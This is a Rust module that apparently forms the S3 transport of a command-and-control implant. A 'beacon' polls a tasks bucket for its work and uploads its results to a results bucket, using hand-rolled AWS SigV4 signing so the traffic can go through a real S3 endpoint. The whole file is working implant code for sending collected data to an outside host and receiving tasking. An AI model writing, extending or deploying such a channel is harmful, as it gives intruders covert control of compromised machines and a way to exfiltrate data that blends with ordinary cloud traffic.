//! The object transport: the beacon reads its work from one bucket and
//! writes its results into another.
//!
//! The requests carry an AWS Signature Version 4 header, so the same
//! beacon can talk to a real S3 endpoint and not only to the server of the
//! team.  The signature covers the method, the path, the headers and the
//! body, so a body that was changed on the way no longer verifies.
//!
//! The access key of the beacon is its id and the secret key is derived
//! from the team key, so one agent cannot read the work of another.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

const IO_TIMEOUT: Duration = Duration::from_secs(60);

/// The addresses of the object store.
#[derive(Debug, Clone)]
pub struct S3Config {
    /// The endpoint of the store: "host:port".
    pub endpoint: String,
    /// The access key: the id of the agent.
    pub access_key: String,
    /// The secret key.
    pub secret_key: String,
    /// The region of the bucket.
    pub region: String,
    /// The bucket the work waits in.
    pub tasks_bucket: String,
    /// The bucket the results go into.
    pub results_bucket: String,
}

/// The object backend of the batch transport.
pub struct S3Backend {
    cfg: S3Config,
    counter: u64,
}

impl S3Backend {
    /// Create the backend of an object store.
    pub fn new(cfg: S3Config) -> Self {
        S3Backend { cfg, counter: 0 }
    }
}

impl crate::transport::BatchBackend for S3Backend {
    fn exchange(&mut self, frames: &[u8]) -> std::io::Result<Vec<u8>> {
        self.counter += 1;
        let key = format!("{}", self.counter);
        exchange(&self.cfg, &key, frames)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
    }
}

/// Exchange one batch of frames with the server.
///
/// The batch goes into the results bucket and the work of the agent comes
/// from the tasks bucket.  An empty answer means the server has nothing
/// for the agent right now.
pub fn exchange(cfg: &S3Config, key: &str, frames: &[u8]) -> Result<Vec<u8>, String> {
    put(cfg, &cfg.results_bucket, key, frames)?;
    get(cfg, &cfg.tasks_bucket, &cfg.access_key)
}

/// put writes an object into a bucket.
pub fn put(cfg: &S3Config, bucket: &str, key: &str, body: &[u8]) -> Result<(), String> {
    let path = format!("/{}/{}", bucket, key);
    let (status, _) = request(cfg, "PUT", &path, body)?;
    if status < 200 || status > 299 {
        return Err(format!("s3: the store refused the object with {status}"));
    }
    Ok(())
}

/// get reads an object from a bucket.
pub fn get(cfg: &S3Config, bucket: &str, key: &str) -> Result<Vec<u8>, String> {
    let path = format!("/{}/{}", bucket, key);
    let (status, body) = request(cfg, "GET", &path, &[])?;
    if status == 404 {
        return Ok(Vec::new());
    }
    if status < 200 || status > 299 {
        return Err(format!("s3: the store answered {status}"));
    }
    Ok(body)
}

/// request builds a signed request, sends it and reads the answer.
fn request(
    cfg: &S3Config,
    method: &str,
    path: &str,
    body: &[u8],
) -> Result<(u16, Vec<u8>), String> {
    let host = cfg.endpoint.trim().to_string();
    let now = crate::link::now_secs();
    let (date, timestamp) = amz_date(now);
    let payload_hash = crate::config::hex_encode(&crate::crypto::sha256(body));
    let signature = sign(
        cfg,
        method,
        path,
        &host,
        body,
        &date,
        &timestamp,
        &payload_hash,
    );
    let head = format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nx-amz-date: {timestamp}\r\n\
         x-amz-content-sha256: {payload_hash}\r\nAuthorization: {signature}\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n",
        body.len()
    );
    let mut stream = TcpStream::connect(&host)
        .map_err(|e| format!("s3: connect {host}: {e}"))?;
    let _ = stream.set_read_timeout(Some(IO_TIMEOUT));
    let _ = stream.set_write_timeout(Some(IO_TIMEOUT));
    stream
        .write_all(head.as_bytes())
        .map_err(|e| format!("s3: write the request: {e}"))?;
    if !body.is_empty() {
        stream
            .write_all(body)
            .map_err(|e| format!("s3: write the body: {e}"))?;
    }
    let _ = stream.flush();
    let mut reader = std::io::BufReader::new(stream);
    let mut buf = Vec::new();
    reader
        .read_to_end(&mut buf)
        .map_err(|e| format!("s3: read the answer: {e}"))?;
    parse_response(&buf)
}

/// parse_response splits an HTTP answer into its status and its body.
fn parse_response(raw: &[u8]) -> Result<(u16, Vec<u8>), String> {
    let split = raw
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .ok_or("s3: the answer has no header")?;
    let head = String::from_utf8_lossy(&raw[..split]).to_string();
    let mut lines = head.split("\r\n");
    let status_line = lines.next().unwrap_or("");
    let mut parts = status_line.split_whitespace();
    let _version = parts.next();
    let status: u16 = parts
        .next()
        .and_then(|v| v.parse().ok())
        .ok_or("s3: the answer has no status")?;
    let mut body = raw[split + 4..].to_vec();
    for line in lines {
        if line.to_ascii_lowercase().starts_with("transfer-encoding:")
            && line.to_ascii_lowercase().contains("chunked")
        {
            body = dechunk(&body);
            break;
        }
    }
    Ok((status, body))
}

/// dechunk reads a chunked body.
fn dechunk(body: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut rest = body;
    loop {
        let line_end = match rest.windows(2).position(|w| w == b"\r\n") {
            Some(pos) => pos,
            None => break,
        };
        let size_text = String::from_utf8_lossy(&rest[..line_end]).to_string();
        let size_text = size_text.split(';').next().unwrap_or("").trim().to_string();
        let size = match usize::from_str_radix(&size_text, 16) {
            Ok(v) => v,
            Err(_) => break,
        };
        rest = &rest[line_end + 2..];
        if size == 0 {
            break;
        }
        if rest.len() < size {
            out.extend_from_slice(rest);
            break;
        }
        out.extend_from_slice(&rest[..size]);
        rest = &rest[size..];
        if rest.len() >= 2 {
            rest = &rest[2..];
        }
    }
    out
}

/// sign computes the signature of a request.
#[allow(clippy::too_many_arguments)]
fn sign(
    cfg: &S3Config,
    method: &str,
    path: &str,
    host: &str,
    body: &[u8],
    date: &str,
    timestamp: &str,
    payload_hash: &str,
) -> String {
    let _ = body;
    let canonical_headers = format!(
        "host:{host}\nx-amz-content-sha256:{payload_hash}\nx-amz-date:{timestamp}\n"
    );
    let signed_headers = "host;x-amz-content-sha256;x-amz-date";
    let canonical_request = format!(
        "{method}\n{path}\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
    );
    let scope = format!("{}/{}/s3/aws4_request", date, cfg.region);
    let string_to_sign = format!(
        "AWS4-HMAC-SHA256\n{timestamp}\n{scope}\n{}",
        crate::config::hex_encode(&crate::crypto::sha256(canonical_request.as_bytes()))
    );
    let k_date = crate::crypto::hmac_sha256(
        format!("AWS4{}", cfg.secret_key).as_bytes(),
        date.as_bytes(),
    );
    let k_region = crate::crypto::hmac_sha256(&k_date, cfg.region.as_bytes());
    let k_service = crate::crypto::hmac_sha256(&k_region, b"s3");
    let k_signing = crate::crypto::hmac_sha256(&k_service, b"aws4_request");
    let signature = crate::config::hex_encode(&crate::crypto::hmac_sha256(
        &k_signing,
        string_to_sign.as_bytes(),
    ));
    format!(
        "AWS4-HMAC-SHA256 Credential={}/{scope}, SignedHeaders={signed_headers}, Signature={signature}",
        cfg.access_key
    )
}

/// amz_date renders the time in the two formats the signature needs: the
/// date of the scope and the timestamp of the request.
fn amz_date(now: u64) -> (String, String) {
    let days = (now / 86400) as i64;
    let secs = now % 86400;
    let (year, month, day) = civil_from_days(days);
    let date = format!("{:04}{:02}{:02}", year, month, day);
    let time = format!(
        "{:02}{:02}{:02}",
        secs / 3600,
        (secs % 3600) / 60,
        secs % 60
    );
    (date, format!("{date}T{time}Z"))
}

/// civil_from_days returns the year, the month and the day of a day count
/// since the epoch.
///
/// The arithmetic is the one of the calendar: it needs no table and no
/// library, and it is right for every day the beacon will ever see.
fn civil_from_days(days: i64) -> (i64, u32, u32) {
    let z = days + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as i64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    (if m <= 2 { y + 1 } else { y }, m as u32, d)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_epoch_is_the_first_of_january() {
        assert_eq!(civil_from_days(0), (1970, 1, 1));
    }

    #[test]
    fn a_leap_day_is_found() {
        // The 29th of February 2024 is the day 19782 of the epoch.
        assert_eq!(civil_from_days(19782), (2024, 2, 29));
    }

    #[test]
    fn the_date_is_rendered_the_way_the_signature_needs_it() {
        let (date, stamp) = amz_date(1_700_000_000);
        assert_eq!(date, "20231114");
        assert_eq!(stamp, "20231114T221320Z");
    }
}
